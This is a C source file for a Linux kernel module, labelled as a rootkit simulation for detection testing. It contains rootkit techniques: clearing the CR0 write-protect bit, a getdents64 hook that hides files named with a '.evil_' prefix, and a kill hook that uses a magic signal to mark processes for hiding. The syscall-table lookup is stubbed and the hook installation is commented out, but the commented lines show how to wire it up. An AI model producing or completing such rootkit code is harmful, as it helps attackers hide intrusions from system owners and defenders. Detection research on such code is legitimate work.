/*
 * Linux Rootkit Simulation - TEST ONLY
 * DO NOT COMPILE OR LOAD
 * For security research and detection testing
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Security Research");
MODULE_DESCRIPTION("Rootkit Simulation for Testing");

#define HIDDEN_PREFIX ".evil_"
#define HIDDEN_PORT 31337
#define MAGIC_SIGNAL 64

// Original syscall table
static unsigned long *sys_call_table;

// Original syscall pointers
static asmlinkage long (*orig_getdents64)(unsigned int fd, 
    struct linux_dirent64 __user *dirent, unsigned int count);
static asmlinkage long (*orig_kill)(pid_t pid, int sig);
static asmlinkage long (*orig_read)(unsigned int fd, char __user *buf, size_t count);

// Hidden process list
static int hidden_pids[256];
static int hidden_pid_count = 0;

// Disable write protection
static void disable_wp(void) {
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    write_cr0(cr0);
}

// Enable write protection
static void enable_wp(void) {
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    write_cr0(cr0);
}

// Hook getdents64 to hide files
static asmlinkage long hooked_getdents64(unsigned int fd,
    struct linux_dirent64 __user *dirent, unsigned int count) {
    
    long ret = orig_getdents64(fd, dirent, count);
    struct linux_dirent64 *d, *kd, *kd_cur;
    unsigned long offset = 0;
    
    if (ret <= 0) return ret;
    
    kd = kzalloc(ret, GFP_KERNEL);
    if (!kd) return ret;
    
    if (copy_from_user(kd, dirent, ret)) {
        kfree(kd);
        return ret;
    }
    
    // Filter hidden entries
    while (offset < ret) {
        kd_cur = (void *)kd + offset;
        
        // Hide files starting with HIDDEN_PREFIX
        if (strncmp(kd_cur->d_name, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX)) == 0) {
            // Remove this entry
            int reclen = kd_cur->d_reclen;
            memmove(kd_cur, (void *)kd_cur + reclen, ret - offset - reclen);
            ret -= reclen;
        } else {
            offset += kd_cur->d_reclen;
        }
    }
    
    copy_to_user(dirent, kd, ret);
    kfree(kd);
    return ret;
}

// Hook kill to hide processes
static asmlinkage long hooked_kill(pid_t pid, int sig) {
    // Magic signal to hide process
    if (sig == MAGIC_SIGNAL) {
        if (hidden_pid_count < 256) {
            hidden_pids[hidden_pid_count++] = pid;
        }
        return 0;
    }
    return orig_kill(pid, sig);
}

// Hook read to filter /proc/net/tcp (hide connections)
static asmlinkage long hooked_read(unsigned int fd, char __user *buf, size_t count) {
    long ret = orig_read(fd, buf, count);
    
    // Would filter network connections on HIDDEN_PORT
    // from /proc/net/tcp output
    
    return ret;
}

// Find syscall table
static unsigned long *find_syscall_table(void) {
    unsigned long *table;
    // Would scan kernel memory for syscall table
    // Using various techniques (kallsyms, memory scanning)
    return NULL;
}

// Module initialization
static int __init rootkit_init(void) {
    printk(KERN_INFO "Rootkit simulation loaded (TEST ONLY)\n");
    
    // sys_call_table = find_syscall_table();
    // if (!sys_call_table) return -1;
    
    // disable_wp();
    // orig_getdents64 = (void *)sys_call_table[__NR_getdents64];
    // sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    // enable_wp();
    
    return 0;
}

// Module cleanup
static void __exit rootkit_exit(void) {
    printk(KERN_INFO "Rootkit simulation unloaded\n");
    
    // Restore original syscalls
    // disable_wp();
    // sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    // enable_wp();
}

module_init(rootkit_init);
module_exit(rootkit_exit);
